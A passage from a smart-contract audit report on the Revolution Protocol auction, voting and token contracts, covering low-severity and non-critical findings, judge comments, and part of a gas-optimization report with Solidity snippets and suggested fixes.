To address this, if it's deemed a vulnerability, the smart contract could be updated to include checks that prevent the same address from being used for all these roles or to implement a more robust system for assigning these rewards. This requires careful consideration of the contract's intended economics and security implications.

## [02] Irreversible correction if `minCreatorRateBps` has been set too high
`AuctionHouse.setMinCreatorRateBps()` require new min rate cannot be lower than previous min rate:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L237-L241

```solidity
        //ensure new min rate cannot be lower than previous min rate
        require(
            _minCreatorRateBps > minCreatorRateBps,
            "Min creator rate must be greater than previous minCreatorRateBps"
        );
```
If it's has been set too high, whether deliberately or accidentally, there's no way to drop the threshold. Hence, this could affect future setting of a new `_creatorRateBps`:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L218-L221

```solidity
        require(
            _creatorRateBps >= minCreatorRateBps,
            "Creator rate must be greater than or equal to minCreatorRateBps"
        );
```
## [03] Addressing Zero-Value Bids in Auction Contracts
The auction contract, as currently designed, presents a a low to medium severity issue due to its allowance for bids of 0 ETH under specific conditions. When the `_createAuction()` function initializes an auction, it sets `auction.amount` to 0 ETH. Combined with a `reserve price` also set at 0 ETH, this configuration allows the first bid to be 0 ETH, which satisfies the contract's require statements for both the reserve price and the minimum bid increment. 

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L179-L183

```solidity
        require(msg.value >= reservePrice, "Must send at least reservePrice");
        require(
            msg.value >= _auction.amount + ((_auction.amount * minBidIncrementPercentage) / 100),
            "Must send more than last bid by minBidIncrementPercentage amount"
        );
```
Subsequent bids can also be 0 ETH, maintaining the same auction amount. This design flaw could lead to an auction proceeding and closing without any financial transaction, contradicting the fundamental purpose of an auction to facilitate competitive bidding and sell items for the highest possible price. Implementing safeguards such as a non-zero minimum reserve price, a required minimum first bid, or dynamic bid increments would be essential to ensure the auction's functionality and integrity.

## [04] Auction Extension Mechanism and Ethereum Transaction Dynamics
The auction extension mechanism in Ethereum-based smart contracts, particularly when combined with the `minBidIncrementPercentage`, presents a low to medium severity issue due to its interaction with the dynamics of Ethereum transactions, including frontrunning and mempool observation. Designed to prevent sniping, the extension mechanism ensures fairness by allowing bids within a `timeBuffer` to prolong the auction. 

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L191-L192

```solidity
        bool extended = _auction.endTime - block.timestamp < timeBuffer;
        if (extended) auction.endTime = _auction.endTime = block.timestamp + timeBuffer;
```
However, this can lead to unpredictability in auction closure, potentially deterring bidders with strict budgets or timelines. Moreover, the visibility of transactions in the mempool before confirmation enables frontrunning, where opportunistic bidders can outbid others by observing their transactions. This scenario can result in auctions closing at lower bids than potentially achievable, as illustrated in the example where an auction expected to close at 11 ETH ends at 10.5 ETH due to frontrunning and extension. 

For example, if the current `_auction.amount` is 10 ETH, and `minBidIncrementPercentage` is 5%. Alice in the last moment attempts to bid 11 ETH. Bob, seeing this in the mempool, frontruns with 10.5 ETH. Alice's call is denied, as 10.5 x 1.05 = 11.025 ETH. `bool extended` is turned on and the auction is extended for a few minutes (`timeBuffer`) but Alice is no longer interested since her budget is 11 ETH. An auction could have been sold for 11 ETH ends up with 10.5 ETH.

The strategic behavior of bidders may also evolve, leading to less transparent and more complex bidding processes. Mitigating these issues could involve implementing secret bids with a reveal phase, employing anti-frontrunning techniques, or adjusting the `minBidIncrementPercentage` dynamically. While these measures aim to balance fairness, predictability, and transactional efficiency, they also introduce their own complexities and trade-offs, making this a nuanced issue requiring careful consideration in smart contract design.

## [05] Impact of Ether Value on Auction Bidding Mechanism
In the `createBid` function of the `AuctionHouse` smart contract, the `minBidIncrementPercentage` parameter, which sets the minimum bid increment in whole percentage points, could significantly impact the auction dynamics, especially in the context of a high Ether value. 

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L180-L183

```solidity
        require(
            msg.value >= _auction.amount + ((_auction.amount * minBidIncrementPercentage) / 100),
            "Must send more than last bid by minBidIncrementPercentage amount"
        );
```
Apparently, the denominator of `100` signifies the lowest minBidIncrementPercentage amount it could go is 1%.

As the worth of Ether increases, a minimum 1% bid increment translates into a larger absolute monetary value, potentially discouraging smaller bidders due to the higher financial commitment required for each subsequent bid. This reduced bid granularity could lead to fewer overall bids and might result in bidders overcommitting, as they are forced to raise their bids by at least this minimum percentage. The situation could alter the strategic approach to bidding, with participants possibly engaging in last-minute bidding wars or being deterred from participating if the increments exceed their budget constraints. 

To ensure a balanced and accessible auction environment, considering a more flexible increment system, such as smaller percentage increments (via the adoption of BPS, e.g. 10\_000 is equivalent to 100%) or a maximum increment cap in Ether, might be beneficial to accommodate varying Ether values and maintain efficient market pricing.

## [06] Considerations for Hardcoding Addresses in Smart Contracts
In the `_settleAuction` function of the `AuctionHouse` smart contract, setting the `builder` and `purchaseReferral` fields to `address(0)` within the `IERC20TokenEmitter.ProtocolRewardAddresses` struct raises important considerations. 

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L403-L407

```solidity
                        IERC20TokenEmitter.ProtocolRewardAddresses({
                            builder: address(0),
                            purchaseReferral: address(0),
                            deployer: deployer
                        })
```
This design choice might align with the contract's current requirements if no rewards are intended for builders or referrers. However, it potentially limits future flexibility and adaptability to new features. While it might offer gas savings, the implications on the contract's functionality and the ecosystem should be carefully evaluated. Moreover, such hardcoding should be transparently documented for clarity and understanding. The use of upgradeable contract patterns provides some leeway for future modifications, but it's crucial to balance immediate simplicity against long-term contract evolution and security.

## [07] Challenges and Strategies in Managing Voting Participation in Growing Communities
As communities involved in cultural indexing and art piece voting grow, they face the challenge of declining active voter participation, which can hinder critical processes such as achieving quorum. 

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L523

```solidity
        require(totalVoteWeights[piece.pieceId] >= piece.quorumVotes, "Does not meet quorum votes to be dropped.");
```
This trend, often due to factors like reduced interest or lack of awareness, necessitates strategic solutions. The protocol can boost engagement through improved communication, incentives for participation, and streamlined voting processes. Additionally, adapting quorum requirements, i.e. `dynamic quorum adjustment` to reflect actual participation rates and carefully balancing tokenomics to avoid concentrated voting power are crucial. These measures, coupled with a focus on fostering long-term community involvement, are key to ensuring that every member feels their contribution is both meaningful and impactful in the evolving landscape of decentralized governance.

## [08] Inaccurate use of inequality operator
In the `getArtPieceById` function within the `VerbsToken` smart contract, the condition require`(verbId <= _currentVerbId, "Invalid piece ID")` should ideally use `<` instead of `<=`. This is because `_currentVerbId` is post-incremented in the `_mintTo` function,

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L294

```solidity
            uint256 verbId = _currentVerbId++;
```
Which means that at any given point, `_currentVerbId` represents the next ID to be assigned, not an ID that has already been assigned to an existing NFT.

When the `_mintTo` function is called, it increments `_currentVerbId` after assigning the current ID to a new NFT. Therefore, the highest valid `verbId` at any moment is `_currentVerbId - 1`. If `getArtPieceById` is called with `verbId` equal to `_currentVerbId`, it refers to an ID that has not yet been assigned to an NFT, leading to a potential reference to a non-existent art piece.

Consider making the following change to ensure that the function only processes requests for IDs that have already been assigned to minted NFTs, thus maintaining the integrity of the function and avoiding potential errors or unexpected behavior.

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L273-L276

```diff
    function getArtPieceById(uint256 verbId) public view returns (ICultureIndex.ArtPiece memory) {
-        require(verbId <= _currentVerbId, "Invalid piece ID");
+        require(verbId < _currentVerbId, "Invalid piece ID");
        return artPieces[verbId];
    }
```
## [09] Potential Risks in Dynamic NFT Metadata Management in `VerbsToken` Smart Contract
The `VerbsToken` smart contract contains two critical functions, [setContractURIHash](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L165-L171) and [setDescriptor](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L226-L236), that pose potential risks due to their ability to alter contract-level and individual NFT metadata, respectively. 

The `setContractURIHash` function, with a low to medium severity level, allows changing the collection-level metadata, which could impact the overall perception and value of the NFTs in the market. This might lead to confusion or mistrust among NFT owners and potential buyers if the collection's description or theme is altered significantly. 

On the other hand, the `setDescriptor` function poses a high-severity risk, as it directly affects the `tokenURI` of each NFT. Changes made by this function can be substantial as the `tokenURI` typically points to a JSON file that contains the NFTs' appearance and features, potentially compromising their originality and authenticity. This could have severe implications for the NFT's value and the owner's rights.

The presence of a [lockDescriptor](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L238-L246) function, which irreversibly prevents further changes to the descriptor, shows an awareness of the potential risks associated with changing NFT metadata. However, the absence of a similar lock function for the `contractURIHash` indicates a different level of consideration for the collection-level metadata compared to the individual NFT metadata.

To mitigate these risks, it is recommended to implement immutable metadata practices, enhance transparency and community involvement in any changes, provide clear documentation, and introduce a versioning system for metadata. 

## [10] `ECDSA.recover` over `ecrecover`
One of the most critical aspects to note about `ecrecover` is its vulnerability to malleable signatures. This means that a valid signature can be transformed into a different valid signature without needing access to the private key. Where possible, adopt `ECDSA.recover` as commented by the imported `EIP712Upgradeable` in CultureIndex.sol.

https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/cryptography/EIP712Upgradeable.sol#L93-L110

```solidity
    /**
     * @dev Given an already https://eips.ethereum.org/EIPS/eip-712#definition-of-hashstruct[hashed struct], this
     * function returns the hash of the fully encoded EIP712 message for this domain.
     *
     * This hash can be used together with {ECDSA-recover} to obtain the signer of a message. For example:
     *
     * ```solidity
     * bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(
     *     keccak256("Mail(address to,string contents)"),
     *     mailTo,
     *     keccak256(bytes(mailContents))
     * )));
     * address signer = ECDSA.recover(digest, signature);
     * ```
     */
    function _hashTypedDataV4(bytes32 structHash) internal view virtual returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), structHash);
    }
``` 
Here's a specific instance entailed:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L435

```solidity
        address recoveredAddress = ecrecover(digest, v, r, s);
```
## [11] Unutilized function
`CultureIndex.hasVoted`:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L250-L258

```solidity
    /**
     * @notice Checks if a specific voter has already voted for a given art piece.
     * @param pieceId The ID of the art piece.
     * @param voter The address of the voter.
     * @return A boolean indicating if the voter has voted for the art piece.
     */
    function hasVoted(uint256 pieceId, address voter) external view returns (bool) {
        return votes[pieceId][voter].voterAddress != address(0);
    }
``` 
could have been used in the following require statement:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L311

```diff
-        require(!(votes[pieceId][voter].voterAddress != address(0)), "Already voted");
+        require(!(hasVoted(pieceId, voter)), "Already voted");
```
## [12] Comment and doc spec mismatch
On https://www.desmos.com/calculator/im67z1tate, the integral of price is supposed to be `p(x) = p0 * (1 - k)^(t - x/r)`. However, the exponent varies on the formula adopted by the protocol:

https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/libs/VRGDAC.sol#L85

```solidity
    // given # of tokens sold, returns integral of price p(x) = p0 * (1 - k)^(x/r) 

## [NC-01] Typo mistakes
https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/MaxHeap.sol#L64

```diff
-    /// @notice Struct to represent an item in the heap by it's ID
+    /// @notice Struct to represent an item in the heap by its ID
```
https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/MaxHeap.sol#L64-L65

```diff
-    /// @notice Struct to represent an item in the heap by it's ID
    mapping(uint256 => uint256) public heap;
+    /// @notice Mapping to represent an item in the heap by it's ID
    mapping(uint256 => uint256) public heap;
```
https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L437-L438

```diff
-        // Ensure to address is not 0
        if (from == address(0)) revert ADDRESS_ZERO();
+        // Ensure from address is not 0
        if (from == address(0)) revert ADDRESS_ZERO();
```
## [13] Activate the optimizer
Before deploying your contract, activate the optimizer when compiling using “solc --optimize --bin sourceFile.sol”. By default, the optimizer will optimize the contract assuming it is called 200 times across its lifetime. If you want the initial contract deployment to be cheaper and the later function executions to be more expensive, set it to “ --optimize-runs=1”. Conversely, if you expect many transactions and do not care for higher deployment cost and output size, set “--optimize-runs” to a high number.

```
module.exports = {
solidity: {
version: "0.8.22",
settings: {
 optimizer: {
   enabled: true,
   runs: 1000,
 },
},
},
};
```
Please visit the following site for further information:

https://docs.soliditylang.org/en/v0.5.4/using-the-compiler.html#using-the-commandline-compiler

Here's one example of instance on opcode comparison that delineates the gas saving mechanism:

```
for !=0 before optimization
PUSH1 0x00
DUP2
EQ
ISZERO
PUSH1 [cont offset]
JUMPI

after optimization
DUP1
PUSH1 [revert offset]
JUMPI
```
Disclaimer: There have been several bugs with security implications related to optimizations. For this reason, Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Please measure the gas savings from optimizations, and carefully weigh them against the possibility of an optimization-related bug. Also, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.

**[rocketman-21 (Revolution) acknowledged and commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/161#issuecomment-1875899188):**
 > Self rebates are an expected downside of the rewards system for now.
 >
 > Solid minor cleanup report though.

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/161#issuecomment-1880167414):**
 > As always, the perfect QA report would be a combination of the best, therefore I also want to mention reports from two other wardens: [peanuts](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/549) and [hals](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/541).  
> 
> This one was selected for report not only because of the amount of `Low` findings, but also because of the overall value provided by the in-depth elaborations.
> 
> Annotations:  
> 01: Intended behaviour, but still valid to point out as `NC` in a QA report.<br>
> 10: Is `NC` because  only 1 of 2 signatures could ever be used due to `nonce`.

***

# Gas Optimizations

For this audit, 17 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/322) by **MrPotatoMagic** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/735), [0xAnah](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/699), [sivanesh\_808](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/570), [c3phas](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/522), [Sathish9098](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/224), [IllIllI](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/690), [hunter\_w3b](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/652), [JCK](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/614), [SAQ](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/595), [fnanni](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/523), [Raihan](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/514), [donkicha](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/498), [lsaudit](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/359), [SovaSlava](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/214), [naman1778](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/159), and [pavankv](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/89).*

# Gas Optimizations Report

| ID     | Optimization                                                                                            |
|--------|---------------------------------------------------------------------------------------------------------|
| [G&#8209;01] | `MAX_NUM_CREATORS` check is not required when minting in VerbsToken.sol contract                        |
| [G&#8209;02] | Mappings not used externally/internally can be marked private                                           |
| [G&#8209;03] | No need to initialize variable `size` to 0                                                              |
| [G&#8209;04] | Use `left + 1` to calculate value of `right` in `maxHeapify()` to save gas                              |
| [G&#8209;05] | Place size check at the start of maxHeapify() to save gas on returning case                             |
| [G&#8209;06] | Cache `parent(current)` in insert() function to save gas                                                |
| [G&#8209;07] | else-if block in function updateValue() can be removed since newValue can never be less than oldValue   |
| [G&#8209;08] | `size > 0` check not required in function getMax()                                                      |
| [G&#8209;09] | Cache `msgValueRemaining - toPayTreasury` in buyToken() to save gas                                     |
| [G&#8209;10] | `creatorsAddress != address(0)` check not required in buyToken()                                        |
| [G&#8209;11] | Cache return value of `_calculateTokenWeight()` function to prevent SLOAD                                 |
| [G&#8209;12] | Cache `erc20VotingToken.totalSupply()` to save gas                                                      |
| [G&#8209;13] | Unnecessary for loop can be removed by shifting its statements into an existing for loop                |
| [G&#8209;14] | Return memory variable `pieceId` instead of storage variable `newPiece.pieceId` to save gas             |
| [G&#8209;15] | Calculate `creatorsShare` before `auctioneerPayment` in buyToken() to prevent unnecessary SUB operation |
| [G&#8209;16] | Remove `msgValue < computeTotalReward(msgValue` check from TokenEmitterRewards.sol contract             |
| [G&#8209;17] | Optimize `computeTotalReward()` and `computePurchaseRewards` into one function to save gas              |
| [G&#8209;18] | Calculation in computeTotalReward() can be simplified to save gas                                       |
| [G&#8209;19] | Negating twice in require check is not required in `_vote()` function                                     |

**Optimizations have been focused on specific contracts/functions as requested by the sponsor in the README [here under Gas Reports](https://code4rena.com/audits/2023-12-revolution-protocol#toc-2-gas-reports).**

## [G-01] `MAX_NUM_CREATORS` check is not required when minting in VerbsToken.sol contract

The check below in the _mintTo() function can be removed since it is already checked when creating a piece in CultureIndex.sol (see [here](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L182)).
```solidity
File: VerbsToken.sol
288:         require(
289:             artPiece.creators.length <= cultureIndex.MAX_NUM_CREATORS(),
290:             "Creator array must not be > MAX_NUM_CREATORS"
291:         );
```

## [G-02] Mappings not used externally/internally can be marked private

The below mappings from the [MaxHeap.sol contract](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L65) can be marked private since they're not used by any other contracts.
```solidity
File: MaxHeap.sol
66:     /// @notice Struct to represent an item in the heap by it's ID
67:     mapping(uint256 => uint256) public heap; 
68: 
69:     uint256 public size = 0;
70: 
71:     /// @notice Mapping to keep track of the value of an item in the heap
72:     mapping(uint256 => uint256) public valueMapping; 
73: 
74:     /// @notice Mapping to keep track of the position of an item in the heap
75:     mapping(uint256 => uint256) public positionMapping; 
```

## [G-03] No need to initialize variable `size` to 0

0 is the default value for an unsigned integer, thus setting it to 0 again is not required.
```solidity
File: MaxHeap.sol
69:     uint256 public size = 0;
```

## [G-04] Use `left + 1` to calculate value of `right` in `maxHeapify()` to save gas

The variable `right` can be re-written as `2 * pos + 1 + 1`. Since we already know `left` is `2 * pos + 1`, we can use left + 1 to save gas. This would mainly remove the MUL opcode (5 gas) and CALLDATALOAD (3 gas) and add just an MLOAD opcode (3 gas) instead. Thus saving a net of 5 gas per call.

Instead of this:
```solidity
File: MaxHeap.sol
099:     function maxHeapify(uint256 pos) internal {
100:         uint256 left = 2 * pos + 1; 
101:         uint256 right = 2 * pos + 2; //@audit Gas - Just use left + 1
```
Use this:
```solidity
File: MaxHeap.sol
099:     function maxHeapify(uint256 pos) internal {
100:         uint256 left = 2 * pos + 1; 
101:         uint256 right = left + 1;
```

## [G-05] Place size check at the start of maxHeapify() to save gas on returning case

The check on Line 107 can be moved to the start of the [maxHeapify()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L94) function. This will save gas when the condition becomes true because the computations from Line 100 to 105 will not be executed for the returning case since we will return early.

Instead of this:
```solidity
File: MaxHeap.sol
099:     function maxHeapify(uint256 pos) internal {
100:         uint256 left = 2 * pos + 1; 
101:         uint256 right = 2 * pos + 2; 
102: 
103:         uint256 posValue = valueMapping[heap[pos]];
104:         uint256 leftValue = valueMapping[heap[left]];
105:         uint256 rightValue = valueMapping[heap[right]];
106: 
107:         if (pos >= (size / 2) && pos <= size) return;
109: 
111:         if (posValue < leftValue || posValue < rightValue) {
113:             
114:             if (leftValue > rightValue) { 
115:                 swap(pos, left);
116:                 maxHeapify(left);
117:             } else {
118:                 swap(pos, right);
119:                 maxHeapify(right);
120:             }
121:         }
122:     }
```
Use this (see line 99):
```solidity
File: MaxHeap.sol
098:     function maxHeapify(uint256 pos) internal {
099:         if (pos >= (size / 2) && pos <= size) return;
100:         uint256 left = 2 * pos + 1; 
101:         uint256 right = 2 * pos + 2; 
102: 
103:         uint256 posValue = valueMapping[heap[pos]];
104:         uint256 leftValue = valueMapping[heap[left]];
105:         uint256 rightValue = valueMapping[heap[right]];
106: 
109: 
111:         if (posValue < leftValue || posValue < rightValue) {
113:             
114:             if (leftValue > rightValue) { 
115:                 swap(pos, left);
116:                 maxHeapify(left);
117:             } else {
118:                 swap(pos, right);
119:                 maxHeapify(right);
120:             }
121:         }
122:     }
```

## [G-06] Cache `parent(current)` in insert() function to save gas

[Link to instance](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L126C1-L127C39)<br>
[Link to another instance](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L147)

Caching the parent() function call will save an unnecessary JUMPDEST and internal operations in the function itself.

Instead of this:
```solidity
File: MaxHeap.sol
138:             swap(current, parent(current));
139:             current = parent(current);
```
Use this:
```solidity
File: MaxHeap.sol
137:             uint256 parentOfCurrent = parentCurrent(current);
138:             swap(current, parentOfCurrent);
139:             current = parentOfCurrent;
```

## [G-07] else-if block in function updateValue() can be removed since newValue can never be less than oldValue

The else-if block below is present in the [updateValue()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/MaxHeap.sol#L150) function. This can be removed because votes made from function [_vote()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L322C1-L322C51) cannot be cancelled or decreased, thus this case is never true. This will save both function execution cost and deployment cost.

```solidity
File: MaxHeap.sol
164:         } else if (newValue < oldValue) maxHeapify(position);
```

## [G-08] `size > 0` check not required in function getMax()

The check `size > 0` is already implemented in the function topVotedPieceId() [here](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L487) (which is accessed from dropTopVotedPiece()) in CultureIndex.sol, thus implementing it in getMax() function in MaxHeap.sol is not required.

```solidity
File: MaxHeap.sol
188:         require(size > 0, "Heap is empty"); 
```

## [G-09] Cache `msgValueRemaining - toPayTreasury` in buyToken() to save gas

The same subtraction operation with the same variables is carried out in three different steps. Consider caching this value to save gas.

Instead of this:
```solidity
File: ERC20TokenEmitter.sol
178:         uint256 creatorDirectPayment = ((msgValueRemaining - toPayTreasury) * entropyRateBps) / 10_000;
179: 
180:         //Tokens to emit to creators
181:         int totalTokensForCreators = ((msgValueRemaining - toPayTreasury) - creatorDirectPayment) > 0
182:             ? getTokenQuoteForEther((msgValueRemaining - toPayTreasury) - creatorDirectPayment)
183:             : int(0);
```
Use this (see Line 177):
```solidity
File: ERC20TokenEmitter.sol
177:         uint256 cachedValue = msgValueRemaining - toPayTreasury;
178:         uint256 creatorDirectPayment = ((cachedValue) * entropyRateBps) / 10_000;
179: 
180:         //Tokens to emit to creators
181:         int totalTokensForCreators = ((cachedValue) - creatorDirectPayment) > 0
182:             ? getTokenQuoteForEther((cachedValue) - creatorDirectPayment)
183:             : int(0);
```

## [G-10] `creatorsAddress != address(0)` check not required in buyToken()

The check below is from the buyToken() function (see [here](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L201)). The second condition `creatorsAddress != address(0)` can be removed since `creatorsAddress` can never be the zero address. This is because function [setCreatorsAddress()](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/ERC20TokenEmitter.sol#L310) implements this check already.

```solidity
File: ERC20TokenEmitter.sol
205:         if (totalTokensForCreators > 0 && creatorsAddress != address(0)) {
```

## [G-11] Cache return value of `_calculateTokenWeight()` function to prevent SLOAD

In the function createPiece() [here](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/CultureIndex.sol#L226), the totalVotesSupply returned can be cached into a memory variable and then assigned to Line 229 and 237. This will prevent the unnecessary SLOAD of `newPiece.totalVoteSupply` on Line 237. 
```solidity
File: CultureIndex.sol
229:         newPiece.totalVotesSupply = _calculateVoteWeight( 
230:             erc20VotingToken.totalSupply(), 
231:             erc721VotingToken.totalSupply()
232:         );
233:         newPiece.totalERC20Supply = erc20VotingToken.totalSupply();
234:         newPiece.metadata = metadata;
235:         newPiece.sponsor = msg.sender; 
236:         newPiece.creationBlock = block.number; 
237:         newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000; 
```

## [G-12] Cache `erc20VotingToken.totalSupply()` to save gas

The value of the call `erc20VotingToken.totalSupply()` is used on Line 230 and Line 233. This can save an unnecessary totalSupply() call on the erc20VotingToken if cached.
```solidity
File: CultureIndex.sol
229:         newPiece.totalVotesSupply = _calculateVoteWeight( 
230:             erc20VotingToken.totalSupply(),
231:             erc721VotingToken.totalSupply()
232:         );
233:         newPiece.totalERC20Supply = erc20VotingToken.totalSupply();
```

## [G-13] Unnecessary for loop can be removed by shifting its statements into an existing for loop  

The for loop on Line 247 is not required since the for loop on Line 239 already loops through the same range [0, creatorArrayLength). Thus the for loop on Line 247 can be removed and the event emissions of PieceCreatorAdded() can be moved into the for loop on Line 239. This would save gas on both deployment and during function execution.

```solidity
File: CultureIndex.sol
239:         for (uint i; i < creatorArrayLength; i++) {
240:             newPiece.creators.push(creatorArray[i]);
241:         }
242: 
243:         emit PieceCreated(pieceId, msg.sender, metadata, newPiece.quorumVotes, newPiece.totalVotesSupply);
244: 
245:         // Emit an event for each creator
246:     
247:         for (uint i; i < creatorArrayLength; i++) {
248:             emit PieceCreatorAdded(pieceId, creatorArray[i].creator, msg.sender, creatorArray[i].bps);
249:         }
```

## [G-14] Return memory variable `pieceId` instead of storage variable `newPiece.pieceId` to save gas

Return memory variable `pieceId` instead of accessing value from storage and returning. This would replace the SLOAD (100 gas) with an MLOAD (3 gas) operation.
```solidity
File: CultureIndex.sol
250:         return newPiece.pieceId;
```

## [G-15] Calculate `creatorsShare` before `auctioneerPayment` in buyToken() to prevent unnecessary SUB operation

On Line 388, when calculating the `auctioneerPayment`, we find out the bps for the auctioneer by subtracting 10000 from creatorRateBps. This SUB operation will not be required if we calculate the `creatorsShare` on Line 391 before the `auctioneerPayment`. In this case the `creatorsShare` can just be calculated using `_auction.amount * creatorRateBps / 10000`. Following which the `auctioneerPayment` can just be calculated using `_auction.amount - creatorsShare` (as done by creatorsShare previously on Line 391). Through this we can see a redundant SUB operation can be removed which helps save gas.
```solidity
File: AuctionHouse.sol
388:                 uint256 auctioneerPayment = (_auction.amount * (10_000 - creatorRateBps)) / 10_000;
389: 
390:                 //Total amount of ether going to creator
391:                 uint256 creatorsShare = _auction.amount - auctioneerPayment;
```

## [G-16] Remove `msgValue < computeTotalReward(msgValue` check from TokenEmitterRewards.sol contract

On Line 18, when passing msgValue as parameter to computeTotalReward(), we will always pass this check because computeTotalReward always returns 2.5% of the msgValue. Thus since msgValue can never be less than 2.5% of itself, the condition never evaluates to true and we never revert.
```solidity
File: TokenEmitterRewards.sol
12:     function _handleRewardsAndGetValueToSend(
13:         uint256 msgValue,
14:         address builderReferral,
15:         address purchaseReferral,
16:         address deployer
17:     ) internal returns (uint256) {
18:         if (msgValue < computeTotalReward(msgValue)) revert INVALID_ETH_AMOUNT();
19: 
20:         return msgValue - _depositPurchaseRewards(msgValue, builderReferral, purchaseReferral, deployer);
21:     }
```

## [G-17] Optimize `computeTotalReward()` and `computePurchaseRewards` into one function to save gas

Both the functions below do the same computation, which is not required if the functions are combined into one. This will also prevent the rounding issue mentioned [here](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/protocol-rewards/src/abstract/RewardSplits.sol#L37).

Instead of this:
```solidity
File: RewardSplits.sol
41:     function computeTotalReward(uint256 paymentAmountWei) public pure returns (uint256) {
42:         if (paymentAmountWei <= minPurchaseAmount || paymentAmountWei >= maxPurchaseAmount) revert INVALID_ETH_AMOUNT();
43: 
45:         return
46:             (paymentAmountWei * BUILDER_REWARD_BPS) /
47:             10_000 +
48:             (paymentAmountWei * PURCHASE_REFERRAL_BPS) /
49:             10_000 +
